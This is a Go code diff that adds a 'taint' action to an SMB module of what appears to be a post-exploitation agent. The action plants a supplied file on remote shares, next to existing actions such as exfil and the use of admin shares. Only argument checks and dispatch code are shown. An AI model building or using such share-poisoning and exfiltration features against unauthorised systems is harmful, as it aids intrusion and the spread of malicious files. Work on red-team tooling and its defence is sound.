@@ -22,7 +22,7 @@ func (c *SmbCommand) Description() string {
 }
 
 type smbArgs struct {
-	Action      string `json:"action"`      // ls, cat, upload, rm, shares, mkdir, mv, push
+	Action      string `json:"action"`      // ls, cat, upload, rm, shares, mkdir, mv, push, taint
 	Host        string `json:"host"`        // target host
 	Share       string `json:"share"`       // share name (e.g., C$, ADMIN$, ShareName)
 	Path        string `json:"path"`        // file/directory path within share
@@ -33,6 +33,7 @@ type smbArgs struct {
 	Content     string `json:"content"`     // file content for upload action
 	Destination string `json:"destination"` // destination path for mv action
 	Source      string `json:"source"`      // local file path for push action
+	PlantName   string `json:"plant_name"`  // filename to plant on shares (for taint action)
 	Port        int    `json:"port"`        // SMB port (default: 445)
 }
 
@@ -107,8 +108,13 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 			return errorResult("Error: -share and -source (local file) required for exfil action. -path is optional (default: random name)")
 		}
 		return smbExfilFile(args)
+	case "taint":
+		if args.Source == "" && args.Content == "" {
+			return errorResult("Error: -source (local file to plant) or -content (inline content) required for taint action")
+		}
+		return smbTaintShares(args)
 	default:
-		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push, exfil", args.Action)
+		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push, exfil, taint", args.Action)
 	}
 }
 
